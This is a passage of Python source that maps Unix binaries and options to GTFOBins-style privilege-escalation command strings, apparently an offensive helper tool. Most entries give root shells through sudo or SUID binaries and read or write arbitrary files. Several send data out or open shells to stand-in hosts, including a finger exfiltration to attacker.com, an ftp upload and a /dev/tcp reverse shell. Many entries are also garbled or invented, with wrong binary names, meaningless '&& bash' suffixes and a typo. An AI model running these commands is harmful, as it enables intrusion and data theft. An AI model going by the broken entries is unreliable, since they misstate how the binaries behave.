            bins.append("bash -c 'dialog --clear --title ""Main Menu"" --menu ""Choose an option:"" 15 50 4 1 ""Show Date"" 2 ""Show Disk Usage"" 3 ""Show Uptime"" 4 ""Exit"" 2>/tmp/menu_choice.txt; choice=$(cat /tmp/menu_choice.txt); case $choice in 1) dialog --msgbox ""Current Date: $(date)"" 10 50;; 2) dialog --msgbox ""Disk Usage: $(df -h)"" 15 50;; 3) dialog --msgbox ""Uptime: $(uptime)"" 10 50;; 4) dialog --msgbox ""Exiting..."" 10 50;; *) dialog --msgbox ""Invalid option."" 10 50;; esac; rm /tmp/menu_choice.txt'")

    elif gtfo_command == "diff":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which diff) .\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ndiff --line-format=%L /dev/null $LFILE")
        elif gtfo_options == "shell":
            bins.append("diff <(echo ""A"") <(echo ""B; /bin/bash"")")

    elif gtfo_command == "dig":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo dig -f $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dig) .\nLFILE=file_to_read\n./dig -f $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ndig -f $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ndig -f $LFILE")
        elif gtfo_options == "shell":
            bins.append("dig +short example.com @attacker.com")

    elif gtfo_command == "distcc":
        if gtfo_options == "sudo":
            bins.append("sudo distcc /bin/sh")
        elif gtfo_options == "shell":
            bins.append("distcc /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which distcc) .\n./distcc /bin/sh -p")
        elif gtfo_options == "file-read":
            bins.append("distcc gcc -o /tmp/output /etc/passwd")
        elif gtfo_options == "file-write":
            bins.append("distcc gcc -o /etc/passwd malicious_source.c")

    elif gtfo_command == "dmidecode":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which distcc) .\nLFILE=file_to_write\n./dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ndmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ndmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("sudo dmidecode; /bin/bash")

    elif gtfo_command == "dmsetup":
        if gtfo_options == "sudo":
            bins.append(r"sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dmsetup) .\nsudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'")
        elif gtfo_options == "file-read":
            bins.append("dmsetup ls")
        elif gtfo_options == "file-write":
            bins.append("dmsetup create snapshot --size 1G /dev/vgname/lvname /dev/snapshot")
        elif gtfo_options == "shell":
            bins.append("sudo dmsetup ls; /bin/bash")

    elif gtfo_command == "dnf":
        if gtfo_options == "sudo":
            bins.append("sudo dnf install -y x-1.0-1.noarch.rpm")
        elif gtfo_options == "suid":
            bins.append("sudo ./dnf install -y x-1.0-1.noarch.rpm")
        elif gtfo_options == "file-read":
            bins.append("dnf provides */filename")
        elif gtfo_options == "file-write":
            bins.append("sudo dnf config-manager --add-repo http://malicious-repo.com/repo.repo")
        elif gtfo_options == "shell":
            bins.append("sudo dnf config-manager --add-repo http://malicious-shell-repo.com/repo.repo")

    elif gtfo_command == "docker":
        if gtfo_options == "sudo":
            bins.append("sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which docker) .\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        elif gtfo_options == "shell":
            bins.append("docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        elif gtfo_options == "file-write":
            bins.append(r"CONTAINER_ID=""$(docker run -d alpine)"" # or existing\nTF=$(mktemp)\necho ""DATA"" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write")
        elif gtfo_options == "file-read":
            bins.append(r"CONTAINER_ID=""$(docker run -d alpine)""  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF")

    elif gtfo_command == "dos2unix":
        if gtfo_options == "file-write":
            bins.append(r"LFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n ""$LFILE1"" ""$LFILE2""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE2=file_to_read\ndos2unix -f -n ""$LFILE2""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE1=file_to_read\nLFILE2=file_to_write\nsudo dos2unix -f -n ""$LFILE1"" ""$LFILE2""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dos2unix) .\nLFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n ""$LFILE1"" ""$LFILE2""")
        elif gtfo_options == "shell":
            bins.append("dos2unix script.sh")

    elif gtfo_command == "dotnet":
        if gtfo_options == "sudo":
            bins.append(r"sudo dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")
        elif gtfo_options == "shell":
            bins.append(r"dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")
        elif gtfo_options == "file-read":
            bins.append(r"export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=file_to_write\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dos2unix) .\nsudo dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")

    elif gtfo_command == "dpkg":
        if gtfo_options == "sudo":
            bins.append(r"sudo dpkg -l\n!/bin/sh")
        elif gtfo_options == "shell":
            bins.append(r"dpkg -l\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("dpkg --listfiles <package_name>")
        elif gtfo_options == "file-write":
            bins.append("dpkg-deb -x <package_name>.deb /tmp/package_contents")
        elif gtfo_options == "suid":
            bins.append("sudo chmod u+s /usr/bin/dpkg")

    elif gtfo_command == "dstat":
        if gtfo_options == "sudo":
            bins.append(r"echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")
        elif gtfo_options == "shell":
            bins.append(r"mkdir -p ~/.dstat\necho 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")
        elif gtfo_options == "file-write":
            bins.append("dstat >> /path/to/output_file.txt")
        elif gtfo_options == "file-read":
            bins.append("cat /path/to/output_file.csv")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dos2unix) .\necho 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")

    elif gtfo_command == "dvips":
        if gtfo_options == "sudo":
            bins.append(r"tex '\special{psfile=""`/bin/sh 1>&0""}\end'\nsudo dvips -R0 texput.dvi")
        elif gtfo_options == "shell":
            bins.append(r"tex '\special{psfile=""`/bin/sh 1>&0""}\end'\ndvips -R0 texput.dvi")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dvips) .\ntex '\special{psfile=""`/bin/sh 1>&0""}\end'\nsudo dvips -R0 texput.dvi")
        elif gtfo_options == "file-read":
            bins.append("dvips -o output.ps")
        elif gtfo_options == "file-write":
            bins.append("dvips input.dvi -o /path/to/output_directory/filename.ps")

    elif gtfo_command == "easy_install":
        if gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\nsudo easy_install $TF")
        elif gtfo_options == "shell":
            bins.append(r"TF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\neasy_install $TF")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho ""import os; os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')"" > $TF/setup.py\neasy_install $TF")
        elif gtfo_options == "file-read":
            bins.append(r"TF=$(mktemp -d)\necho 'print(open(""file_to_read"").read())' > $TF/setup.py\neasy_install $TF")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which easy_install) .\nTF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\nsudo easy_install $TF")

    elif gtfo_command == "eb":
        if gtfo_options == "shell":
            bins.append(r"eb logs\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo eb logs\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which eb) .\nsudo eb logs\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("eb logs")
        elif gtfo_options == "file-write":
            bins.append("echo ""New content"" > /path/to/file.txt")

    elif gtfo_command == "ed":
        if gtfo_options == "shell":
            bins.append(r"ed\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo ed\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ed) .\n./ed file_to_read\n,p\nq")
        elif gtfo_options == "file-write":
            bins.append(r"ed file_to_write\na\nDATA\n.\nw\nq")
        elif gtfo_options == "file-read":
            bins.append(r"ed file_to_read\n,p\nq")

    elif gtfo_command == "efax":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo efax -d ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which efax) .\nLFILE=file_to_read\n./efax -d ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append("efax -d /dev/modem -n 1234567890 -t ""Recipient Name"" -F ""Sender Name"" file-to-send.txt")
        elif gtfo_options == "file-write":
            bins.append("efax -d /dev/modem -r received_fax.tiff > efax_log.txt 2>&1")
        elif gtfo_options == "shell":
            bins.append(r"efax -d /dev/modem -r received_fax.tiff\nbash")

    elif gtfo_command == "elvish":
        if gtfo_options == "shell":
            bins.append("elvish")
        elif gtfo_options == "sudo":
            bins.append("sudo elvish")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which elvish) .\n./elvish")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=file_to_write\nelvish -c 'echo DATA >$E:LFILE'")
        elif gtfo_options == "file-read":
            bins.append(r"export LFILE=file_to_read\nelvish -c 'echo (slurp <$E:LFILE)'")

    elif gtfo_command == "emacs":
        if gtfo_options == "shell":
            bins.append("emacs -Q -nw --eval '(term ""/bin/sh"")'")
        elif gtfo_options == "sudo":
            bins.append("sudo emacs -Q -nw --eval '(term ""/bin/sh"")'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which emacs) .\n./emacs -Q -nw --eval '(term ""/bin/sh -p"")'")
        elif gtfo_options == "file-read":
            bins.append("emacs file_to_read")
        elif gtfo_options == "file-write":
            bins.append(r"emacs file_to_write\nDATA\nC-x C-s")

    elif gtfo_command == "enscript":
        if gtfo_options == "shell":
            bins.append("enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")
        elif gtfo_options == "sudo":
            bins.append("sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")
        elif gtfo_options == "file-read":
            bins.append("enscript file.txt -o output.txt")
        elif gtfo_options == "file-write":
            bins.append("enscript file.txt > output.ps")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which enscript) .\nsudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")

    elif gtfo_command == "env":
        if gtfo_options == "shell":
            bins.append("env /bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo env /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which env) .\n./env /bin/sh -p")
        elif gtfo_options == "file-read":
            bins.append("env $(cat envfile) bash -c 'echo $VAR1 $VAR2'")
        elif gtfo_options == "file-write":
            bins.append("env PATH=/custom/path echo ""SCRIPT"" > output.txt")

    elif gtfo_command == "eqn":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo eqn ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which eqn) .\nLFILE=file_to_read\n./eqn ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\neqn ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("eqn equations.txt | groff -ms > output.ps")
        elif gtfo_options == "shell":
            bins.append("eqn - <(echo "".EQ; x = (-b +- sqrt(b^2 - 4ac)) / 2a; .EN"") | groff -ms && bash")

    elif gtfo_command == "espeak":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo espeak -qXf ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which espeak) .\nLFILE=file_to_read\n./espeak -qXf ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nespeak -qXf ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("echo ""This is an example text for espeak."" > example.txt && espeak -f example.txt")
        elif gtfo_options == "shell":
            bins.append("espeak ""Now spawning a new shell"" && bash")

    elif gtfo_command == "ex":
        if gtfo_options == "shell":
            bins.append(r"ex\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo ex\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append(r"ex file_to_read\n,p\nq")
        elif gtfo_options == "file-write":
            bins.append(r"ex file_to_write\na\nDATA\n.\nw\nq")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ex) .\nsudo ex\n!/bin/sh")

    elif gtfo_command == "exiftool":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT")
        elif gtfo_options == "shell":
            bins.append("exiftool -Comment=""$(echo 'bash' | base64)"" example.jpg && bash")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which exiftool) .\nLFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT")

    elif gtfo_command == "expand":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo expand ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nexpand ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which expand) .\nLFILE=file_to_read\n./expand ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("expand sample.txt > expanded_sample.txt")
        elif gtfo_options == "shell":
            bins.append("expand sample.txt > expanded_sample.txt && bash")

    elif gtfo_command == "expect":
        if gtfo_options == "shell":
            bins.append("expect -c 'spawn /bin/sh;interact'")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nexpect $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which expect) .\n./expect -c 'spawn /bin/sh -p;interact'")
        elif gtfo_options == "sudo":
            bins.append("sudo expect -c 'spawn /bin/sh;interact'")
        elif gtfo_options == "file-write":
            bins.append(r"expect -c 'spawn ssh your-username@your-remote-server; expect ""password:""; send ""your-password\r""; interact'")

    elif gtfo_command == "facter":
        if gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nsudo FACTERLIB=$TF facter")
        elif gtfo_options == "shell":
            bins.append(r"TF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nFACTERLIB=$TF facter")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which facter) .\nTF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nsudo FACTERLIB=$TF facter")
        elif gtfo_options == "file-write":
            bins.append("facter > system_facts.txt")
        elif gtfo_options == "file-read":
            bins.append("facter --custom_fact=$(cat filename.txt)")

    elif gtfo_command == "file":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nfile -f $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo file -f $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which file) .\nLFILE=file_to_read\n./file -f $LFILE")
        elif gtfo_options == "file-write":
            bins.append("file file.txt > output.txt")
        elif gtfo_options == "shell":
            bins.append("file script.sh (MUST MAKE A shell SCRIPT)")

    elif gtfo_command == "find":
        if gtfo_options == "shell":
            bins.append(r"find . -exec /bin/sh \; -quit")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nfind / -fprintf ""$FILE"" DATA -quit")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which find) .\n./find . -exec /bin/sh -p \; -quit")
        elif gtfo_options == "sudo":
            bins.append(r"sudo find . -exec /bin/sh \; -quit")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nfind / -fprintf ""$FILE"" DATA -quit")

    elif gtfo_command == "finger":
        if gtfo_options == "shell":
            bins.append(r"RHOST=attacker.com\nLFILE=file_to_send\nfinger ""$(base64 $LFILE)@$RHOST""")
        elif gtfo_options == "file-read":
            bins.append(r"RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("finger user > user_info.txt")
        elif gtfo_options == "sudo":
            bins.append(r"RHOST=attacker.com\nLFILE=file_to_send\nsudo finger ""$(base64 $LFILE)@$RHOST""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which finger) .\nRHOST=attacker.com\nLFILE=file_to_send\n./finger ""$(base64 $LFILE)@$RHOST""")

    elif gtfo_command == "fish":
        if gtfo_options == "shell":
            bins.append("fish")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which fish) .\n./fish")
        elif gtfo_options == "sudo":
            bins.append("sudo fish")
        elif gtfo_options == "file-read":
            bins.append("cat file.txt")
        elif gtfo_options == "file-write":
            bins.append("echo ""SCRIPT"" > file.txt")

    elif gtfo_command == "flock":
        if gtfo_options == "shell":
            bins.append("flock -u / /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which flock) .\n./flock -u / /bin/sh -p")
        elif gtfo_options == "sudo":
            bins.append("sudo flock -u / /bin/sh")
        elif gtfo_options == "file-write":
            bins.append("flock /tmp/mylockfile -c 'echo ""New content"" > /path/to/file'")
        elif gtfo_options == "file-read":
            bins.append("flock -x /tmp/mylockfile cat /path/to/file")

    elif gtfo_command == "fmt":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo fmt -pNON_EXISTING_PREFIX ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which fmt) .\nLFILE=file_to_read\n./fmt -999 ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("flock -x /tmp/mylockfile -c ""fmt /path/to/inputfile > /path/to/outputfile""")
        elif gtfo_options == "shell":
            bins.append("bash -c 'fmt /path/to/inputfile > /path/to/outputfile'")

    elif gtfo_command == "fold":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nfold -w99999999 ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which fold) .\nLFILE=file_to_read\n./fold -w99999999 ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo fold -w99999999 ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("fold -w 1000 /dev/null > /tmp/exploit.sh && chmod +x /tmp/exploit.sh && /tmp/exploit.sh")
        elif gtfo_options == "shell":
            bins.append("sudo fold -w 1000 /dev/null | bash -i >& /dev/tcp/attacker_ip/4444 0>&1")

    elif gtfo_command == "fping":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nfping -f $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo fping -f $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nfping -f $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which fping) .\nLFILE=file_to_read\nsudo fping -f $LFILE")
        elif gtfo_options == "shell":
            bins.append("fping -a 127.0.0.1 | bash")

    elif gtfo_command == "ftp":
        if gtfo_options == "shell":
            bins.append(r"ftp\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo ftp\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append(r"RHOST=attacker.com\nftp $RHOST\nput file_to_send")
        elif gtfo_options == "file-write":
            bins.append("put reverse_shell.sh /var/www/html/reverse_shell.sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ftp) .\nsudo ftp\n!/bin/sh")

    elif gtfo_command == "gawk":
        if gtfo_options == "shell":
            bins.append("gawk 'BEGIN {system(""/bin/sh"")}'")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ngawk '//' ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which gawk) .\nLFILE=file_to_read\n./gawk '//' ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append("sudo gawk 'BEGIN {system(""/bin/sh"")}'")

    elif gtfo_command == "gcloud":
        if gtfo_options == "shell":
            bins.append(r"gcloud help\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo gcloud help\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which gcloud) .\n./gcloud help\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins,append("gsutil cat gs://[BUCKET_NAME]/[FILE_PATH]")
        elif gtfo_options == "file-write":
            bins.append("gsutil cp [LOCAL_FILE_PATH] gs://[BUCKET_NAME]/[DESTINATION_PATH]")

    elif gtfo_command == "gcore":
        if gtfo_options == "file-read":
            bins.append("gcore $PID")
        elif gtfo_options == "sudo":
            bins.append("sudo gcore $PID")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which gcore) .\n./gcore $PID")
        elif gtfo_options == "shell":
            bins.append(r"bash &\nsudo gcore -o core_dump [PID]")
        elif gtfo_options == "file-write":
            bins.append("gcore -o [output_file_prefix] [PID]")

    elif gtfo_command == "gdb":
        if gtfo_options == "shell":
            bins.append("gdb -nx -ex '!sh' -ex quit")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ngdb -nx -ex ""dump value $LFILE \"DATA\""" -ex quit")
        elif gtfo_options == "file-read":
            bins.append("gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which gdb) .\n./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit")
        elif gtfo_options == "sudo":
            bins.append("sudo gdb -nx -ex '!sh' -ex quit")

    elif gtfo_command == "gem":
        if gtfo_options == "shell":
            bins.append("gem open -e ""/bin/sh -c /bin/sh"" rdoc")
        elif gtfo_options == "file-write":
            bins.append(r"TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/x\ngem build $TF/x")
        elif gtfo_options == "file-read":
            bins.append(r"gem open rdoc\n:!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which gem) .\n./gem open -e ""/bin/sh -c /bin/sh"" rdoc")
        elif gtfo_options == "sudo":
            bins.append("sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc")

    elif gtfo_command == "genie":
        if gtfo_options == "shell":
            bins.append("genie -c '/bin/sh'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which genie) .\n./genie -c '/bin/sh'")
        elif gtfo_options == "sudo":
            bins.append("sudo genie -c '/bin/sh'")
        elif gtfo_options == "file-read":
            bins.append(r"genie -s\ncat /path/to/file.txt")
        elif gtfo_options == "file-write":
            bins.append("echo ""SCRIPT"" > /path/to/file.txt")

    elif gtfo_command == "genisoimage":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ngenisoimage -q -o - ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which genisoimage) .\nLFILE=file_to_read\n./genisoimage -sort ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\ngenisoimage -q -o - ""$LFILE""")            
        elif gtfo_options == "shell":
            bins.append(r"genisoimage -o /path/to/output.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -R -J /path/to/bootable/directory && echo -e ""DEFAULT linux\nLABEL linux\n  KERNEL /boot/vmlinuz\n  APPEND init=/bin/bash"" > /path/to/bootable/directory/isolinux/isolinux.cfg")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ngenisoimage -q -o - ""$LFILE""")

    elif gtfo_command == "ghc" or gtfo_command == "ghci":
        if gtfo_options == "shell":
            bins.append("ghc -e 'System.Process.callCommand ""/bin/sh""'")
        elif gtfo_options == "sudo":
            bins.append("sudo ghc -e 'System.Process.callCommand ""/bin/sh""'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ghc) .\n./ghc -e 'System.Process.callCommand ""/bin/sh""'")
        elif gtfo_options == "file-write":
            bins.append("ghc -o output_file input_file.hs")
        elif gtfo_options == "file-read":
            bins.append("ghc -o readFileProgram ReadFile.hs")

    elif gtfo_command == "gimp":
        if gtfo_options == "shell":
            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'")
        elif gtfo_options == "file-write":
            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'")
        elif gtfo_options == "file-read":
            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which gimp) .\n./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'")
        elif gtfo_options == "sudo":
            bins.append("sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'")

    elif gtfo_command == "ginsh":
        if gtfo_options == "shell":
            bins.append(r"ginsh\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo ginsh\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ginsh) .\n./ginsh\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("cat /path/to/file.txt")
        elif gtfo_options == "file-write":
            bins.append("echo ""SCRIPT"" > /path/to/file.txt")

    elif gtfo_command == "git":
        if gtfo_options == "shell":
            bins.append(r"git help config\n!/bin/sh")
        elif gtfo_options == "file-write":
            bins.append("git apply --unsafe-paths --directory / x.patch")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ngit diff /dev/null $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"sudo git help config\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which git) .\nPAGER='sh -c ""exec sh 0<&1""' ./git -p help")

    elif gtfo_command == "grc":
        if gtfo_options == "shell":
            bins.append("grc --pty /bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo grc --pty /bin/sh")
        elif gtfo_options == "file-read":
            bins.append("grc cat filename.txt")
        elif gtfo_options == "file-write":
            bins.append("grc echo "" > filename.txt")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which grc) .\ngrc --pty /bin/sh")

    elif gtfo_command == "grep":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ngrep '' $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which grep) .\nLFILE=file_to_read\n./grep '' $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\ngrep '' $LFILE")
        elif gtfo_options == "shell":
            bins.append("echo ""Hello World"" | grep -q ""Hello"" && bash")
